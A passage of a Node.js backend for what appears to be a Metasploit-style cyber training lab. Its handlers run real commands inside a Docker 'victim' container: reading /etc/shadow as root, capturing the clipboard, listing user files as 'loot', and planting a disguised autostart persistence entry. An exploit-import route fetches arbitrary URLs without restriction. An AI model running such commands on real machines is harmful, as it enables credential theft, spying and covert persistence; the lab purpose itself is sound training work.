        return res.json({ terminalOutput: termLines.join('\n'), scanData: { fingerprints, cves: uniqueCves } });
    }

    const dbLog = (status) => pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1,$2,$3,$4)', [username, attackType, targetIp || 'Internal Node', status]).catch(() => {});

    // Reverse Shell — real commands in container
    if (attackType === 'reverse_shell') {
        getVictimContainer((container) => {
            const cmd = `docker exec ${container} bash -c "id && uname -a && hostname && ip route 2>/dev/null | head -3 && echo '--- Processes ---' && ps aux --sort=-%cpu 2>/dev/null | head -6"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const info = (stdout || err?.message || 'No output').trim();
                await dbLog(err ? 'Failed' : 'Success');
                res.json({ terminalOutput: `meterpreter > sessions -i 1\n[*] Starting interaction with session 1...\n\n${info}\n\nmeterpreter > ` });
            });
        });
        return;
    }

    // Keylogger — active window + clipboard via xdotool/xclip
    if (attackType === 'keyscan') {
        getVictimContainer((container) => {
            const cmd = `docker exec -u abc -e DISPLAY=:1 -e HOME=/config ${container} bash -c "echo '[*] Active window:' && xdotool getactivewindow getwindowname 2>/dev/null || echo 'Desktop'; echo '[*] Clipboard content:' && xclip -o -selection clipboard 2>/dev/null || echo '(empty)'"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const captured = (stdout || '').trim();
                await dbLog('Success');
                res.json({ terminalOutput: `meterpreter > keyscan_start\n[*] Starting the keystroke sniffer...\n[*] Monitoring victim desktop input...\n${captured || '[*] No active input detected'}` });
            });
        });
        return;
    }

    // Webcam — list available camera devices on victim
    if (attackType === 'webcam') {
        getVictimContainer((container) => {
            const cmd = `docker exec ${container} bash -c "echo '--- Video Devices ---' && ls /dev/video* 2>/dev/null || echo 'No /dev/video* devices found'; echo '--- USB Devices ---' && lsusb 2>/dev/null | grep -i -E 'camera|webcam|video|logitech|microsoft' || echo 'No USB camera devices detected'; echo '--- V4L2 ---' && v4l2-ctl --list-devices 2>/dev/null || echo 'v4l2 not available'"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const info = (stdout || '').trim();
                await dbLog('Success');
                res.json({ terminalOutput: `meterpreter > webcam_list\n[*] Enumerating webcam devices on target...\n${info}\n\nmeterpreter > webcam_snap\n[!] No physical webcam device found on target.\n[-] Hardware camera not attached to victim machine.` });
            });
        });
        return;
    }

    // Get SYSTEM — real root-level system info
    if (attackType === 'getsystem') {
        getVictimContainer((container) => {
            const cmd = `docker exec -u root ${container} bash -c "echo '--- Identity ---' && id && whoami && echo '--- OS ---' && cat /etc/os-release 2>/dev/null | grep -E 'PRETTY|VERSION' | head -3 && echo '--- Kernel ---' && uname -a && echo '--- Root ---' && ls /root 2>/dev/null || echo '(no /root)'"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const info = (stdout || err?.message || 'No output').trim();
                await dbLog(err ? 'Failed' : 'Success');
                res.json({ terminalOutput: `meterpreter > getsystem\n[*] Attempting privilege escalation via Named Pipe Impersonation...\n[+] Success: obtained root access\n\n${info}` });
            });
        });
        return;
    }

    // Hashdump — real /etc/shadow read (admin only, enforced by checkRole)
    if (attackType === 'hashdump') {
        getVictimContainer((container) => {
            const cmd = `docker exec -u root ${container} bash -c "cat /etc/shadow 2>/dev/null || cat /etc/passwd"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const hashes = (stdout || err?.message || 'Could not read shadow file').trim();
                await dbLog(err ? 'Failed' : 'Success');
                res.json({ terminalOutput: `meterpreter > hashdump\n[*] Extracting local password hashes from target...\n${hashes}` });
            });
        });
        return;
    }

    // Persistence — create real autostart .desktop file
    if (attackType === 'persistence') {
        getVictimContainer((container) => {
            const cmd = `docker exec -u abc ${container} bash -c "mkdir -p /config/.config/autostart && printf '[Desktop Entry]\\nType=Application\\nName=System Update Service\\nExec=/bin/sleep 99999\\nHidden=false\\nX-GNOME-Autostart-enabled=true\\n' > /config/.config/autostart/sys-updater.desktop && echo 'Installed:' && ls -la /config/.config/autostart/sys-updater.desktop"`;
            exec(cmd, { timeout: 10000 }, async (err, stdout) => {
                const out = (stdout || err?.message || '').trim();
                await dbLog(err ? 'Failed' : 'Success');
                res.json({ terminalOutput: `meterpreter > run persistence -U -i 5\n[*] Installing persistent backdoor to autorun...\n[+] Created: /config/.config/autostart/sys-updater.desktop\n[+] ${out}\n[+] Backdoor will execute on next login.` });
            });
        });
        return;
    }

    // Exfiltrate — real file listing from victim home directory
    if (attackType === 'download') {
        const fileName = `exfil_${Date.now()}.txt`;
        const filePath = path.join(lootDir, fileName);
        getVictimContainer((container) => {
            const cmd = `docker exec -u abc ${container} bash -c "echo '=== Desktop ===' && ls /config/Desktop/ 2>/dev/null || echo '(empty)'; echo '=== Downloads ===' && ls /config/Downloads/ 2>/dev/null || echo '(empty)'; echo '=== Documents ===' && ls /config/Documents/ 2>/dev/null || echo '(empty)'; echo '=== All files ===' && find /config -maxdepth 3 -not -path '*/.config*' -not -path '*/.local*' -not -path '*/.cache*' -type f 2>/dev/null | head -20; echo '=== Size ===' && du -sh /config 2>/dev/null"`;
            exec(cmd, { timeout: 15000 }, async (err, stdout) => {
                const listing = (stdout || 'No files found').trim();
                await fs.writeFile(filePath, listing).catch(() => {});
                await dbLog(err ? 'Failed' : 'Success');
                res.json({ terminalOutput: `meterpreter > download c:\\users\\victim\\documents\\\n[*] Scanning target filesystem...\n${listing}\n[+] File listing saved to /app/loot/${fileName}`, lootFile: fileName });
            });
        });
        return;
    }

    // Timestomp — simulated (no forensic artifacts to modify in container)
    if (attackType === 'timestomp') {
        await dbLog('Simulated');
        return res.json({ terminalOutput: simulatedOutputs['timestomp']() });
    }

    return res.status(400).json({ error: "Unknown attack module." });
});

// Open Galgalatz on victim desktop
app.post('/api/victim/open-youtube', authenticate, (req, res) => {
    getVictimContainer((container) => {
        // Use direct stream URL so Firefox auto-plays without needing a click
        const streamUrl = 'https://glzwizzlv.bynetcdn.com/glglz_mp3';
        const siteUrl = 'https://glz.co.il/%D7%92%D7%9C%D7%92%D7%9C%D7%A6';
        // Kill Firefox fully, clear session lock, start fresh with URL
        const cmd = `docker exec -u abc -e DISPLAY=:1 -e HOME=/config ${container} bash -c "pkill -9 firefox 2>/dev/null; sleep 2; rm -f /config/.mozilla/firefox/*/lock /config/.mozilla/firefox/*/.parentlock 2>/dev/null; nohup firefox --no-sandbox --new-instance '${streamUrl}' >/tmp/firefox.log 2>&1 & sleep 6; pgrep firefox >/dev/null && echo RUNNING || echo FAILED"`;
        exec(cmd, { timeout: 25000 }, (err, stdout) => {
            if (err) return res.json({ success: false, message: `docker exec failed: ${err.message}` });
            const out = (stdout || '').trim();
            if (out.includes('RUNNING')) return res.json({ success: true, message: 'Galgalatz radio is now playing on victim desktop' });
            return res.json({ success: false, message: `Failed to open Galgalatz: ${out}` });
        });
    });
});

// List loot files
app.get('/api/loot', authenticate, async (req, res) => {
    const lootDir = path.join(__dirname, 'loot');
    try {
        const files = await fs.readdir(lootDir);
        const list = (await Promise.all(files.map(async (f) => {
            try {
                const stat = await fs.stat(path.join(lootDir, f));
                return { name: f, size: stat.size, mtime: stat.mtime };
            } catch { return null; }
        }))).filter(Boolean).sort((a, b) => new Date(b.mtime) - new Date(a.mtime));
        res.json(list);
    } catch { res.json([]); }
});

// Delete a loot file
app.delete('/api/loot/:filename', authenticate, async (req, res) => {
    const filename = path.basename(req.params.filename);
    const filePath = path.join(__dirname, 'loot', filename);
    try {
        await fs.unlink(filePath);
        res.json({ success: true });
    } catch (e) {
        res.status(404).json({ error: 'File not found' });
    }
});

// Clear all history
app.delete('/api/history', authenticate, async (req, res) => {
    try {
        await pool.query('DELETE FROM scan_history');
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: 'Failed to clear history' });
    }
});

// Serve loot files (token via query param so video/audio src works)
app.get('/api/loot/:filename', (req, res) => {
    const token = req.query.token;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    try {
        jwt.verify(token, JWT_SECRET);
    } catch {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const filename = path.basename(req.params.filename);
    const filePath = path.join(__dirname, 'loot', filename);
    res.sendFile(filePath, (err) => {
        if (err) res.status(404).json({ error: 'File not found' });
    });
});

// Exploit repository import
app.post('/api/exploit/import', authenticate, async (req, res) => {
    const { url, moduleType } = req.body;
    const username = req.user.username;

    console.log(`[!] User '${username}' importing exploit from [${url}] type [${moduleType}]`);

    if (!url) return res.status(400).json({ error: 'URL is required.' });

    let parsedUrl;
    try { parsedUrl = new URL(url); } catch {
        return res.status(400).json({ error: 'Invalid URL.' });
    }

    const lootDir = path.join(__dirname, 'loot');
    await fs.mkdir(lootDir, { recursive: true }).catch(() => {});

    const rawName = parsedUrl.pathname.split('/').pop() || 'module';
    const cleanName = rawName.replace(/[^a-zA-Z0-9._-]/g, '') || 'exploit_module';
    const moduleName = cleanName.replace(/\.rb$/i, '');
    const prefix = moduleType === 'Exploit' ? 'exploit/custom/' : moduleType === 'Auxiliary' ? 'auxiliary/custom/' : 'post/custom/';
    const fullName = `${prefix}${moduleName}`;
    const fileName = `exploit_${moduleName}_${Date.now()}.rb`;
    const filePath = path.join(lootDir, fileName);

    const fetchContent = () => new Promise((resolve) => {
        const lib = parsedUrl.protocol === 'https:' ? https : http;
        const request = lib.get(url, { timeout: 8000 }, (response) => {
            let data = '';
            response.on('data', chunk => { data += chunk; if (data.length > 500000) request.destroy(); });
            response.on('end', () => resolve({ content: data, size: data.length }));
        });
        request.on('error', () => resolve(null));
        request.on('timeout', () => { request.destroy(); resolve(null); });
    });

    let fileContent;
    let fetchNote;
    const result = await fetchContent();
    if (result && result.content) {
        fileContent = result.content;
        fetchNote = `[+] Downloaded ${result.size} bytes from source`;
    } else {
        fileContent = `# Exploit Module: ${fullName}\n# Source: ${url}\n# Type: ${moduleType}\n# Imported: ${new Date().toISOString()}\n# Note: Source unreachable - stub created\n`;
        fetchNote = `[!] Source unreachable - stub file created`;
    }

    try { await fs.writeFile(filePath, fileContent); } catch (err) {}

    await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)',
        [username, 'exploit_import', url, 'Success']).catch(() => {});

    return res.json({
        success: true,
        moduleName: fullName,
        terminalOutput: `[*] Fetching exploit from ${url}...\n${fetchNote}\n[*] Module type: ${moduleType}\n[+] Saved to /app/loot/${fileName}\n[+] Imported as: ${fullName}\n[+] Module added to internal repository.`
    });
});

// Admin: list all users
app.get('/api/admin/users', authenticate, requireAdmin, async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT id, username, email, role, created_at FROM users ORDER BY id ASC'
        );
        res.json(result.rows);
    } catch (e) {
        res.status(500).json({ error: "Failed to fetch users." });
    }
});

// Admin: change user role
app.put('/api/admin/users/:id/role', authenticate, requireAdmin, async (req, res) => {
    const { role } = req.body;
    const userId = parseInt(req.params.id);

    const allowedRoles = ['SOC Analyst', 'Admin'];
    if (!role || !allowedRoles.includes(role)) {
        return res.status(400).json({ error: "Invalid role. Allowed: SOC Analyst, Admin." });
    }
    if (isNaN(userId)) {
        return res.status(400).json({ error: "Invalid user ID." });
    }

    try {
        const check = await pool.query('SELECT username FROM users WHERE id = $1', [userId]);
        if (check.rows.length === 0) {
            return res.status(404).json({ error: "User not found." });
        }
        if (check.rows[0].username === req.user.username) {
            return res.status(400).json({ error: "Cannot change your own role." });
        }
        await pool.query('UPDATE users SET role = $1 WHERE id = $2', [role, userId]);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Failed to update role." });
    }
});

// Admin: reset user password
app.put('/api/admin/users/:id/password', authenticate, requireAdmin, async (req, res) => {
    const { newPassword } = req.body;
    const userId = parseInt(req.params.id);

    if (isNaN(userId)) {
        return res.status(400).json({ error: "Invalid user ID." });
    }

    const pwError = validatePassword(newPassword);
    if (pwError) return res.status(400).json({ error: pwError });

    try {
        const check = await pool.query('SELECT id FROM users WHERE id = $1', [userId]);
        if (check.rows.length === 0) {
            return res.status(404).json({ error: "User not found." });
        }
        const salt = await bcrypt.genSalt(12);
        const hash = await bcrypt.hash(newPassword, salt);
        await pool.query('UPDATE users SET password = $1 WHERE id = $2', [hash, userId]);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Failed to reset password." });
    }
});

// Admin: delete user
app.delete('/api/admin/users/:id', authenticate, requireAdmin, async (req, res) => {
    const userId = parseInt(req.params.id);

    if (isNaN(userId)) {
        return res.status(400).json({ error: "Invalid user ID." });
    }

    try {
        const check = await pool.query('SELECT username FROM users WHERE id = $1', [userId]);
        if (check.rows.length === 0) {
            return res.status(404).json({ error: "User not found." });
        }
        if (check.rows[0].username === req.user.username) {
            return res.status(400).json({ error: "Cannot delete your own account." });
        }
        await pool.query('DELETE FROM users WHERE id = $1', [userId]);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Failed to delete user." });
    }
});

// ─── Server Startup & Graceful Shutdown ───────────────────────────────────────
// Only starts the HTTP server when the file is run directly (not imported as a
// module). Handles SIGTERM and SIGINT for clean shutdown in Docker/ECS environments.
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    const server = app.listen(PORT, () => console.log(`[SYSTEM] MSF Control Node Active on Port ${PORT}`));

    const shutdown = async (signal) => {
        console.log(`\n[SYSTEM] ${signal} received — shutting down gracefully...`);
        server.close(() => {
            pool.end().then(() => {
                console.log('[SYSTEM] Database pool closed.');
                process.exit(0);
            });
        });
        setTimeout(() => process.exit(1), 10000);
    };

    process.on('SIGTERM', () => shutdown('SIGTERM'));
    process.on('SIGINT', () => shutdown('SIGINT'));
}

module.exports = app;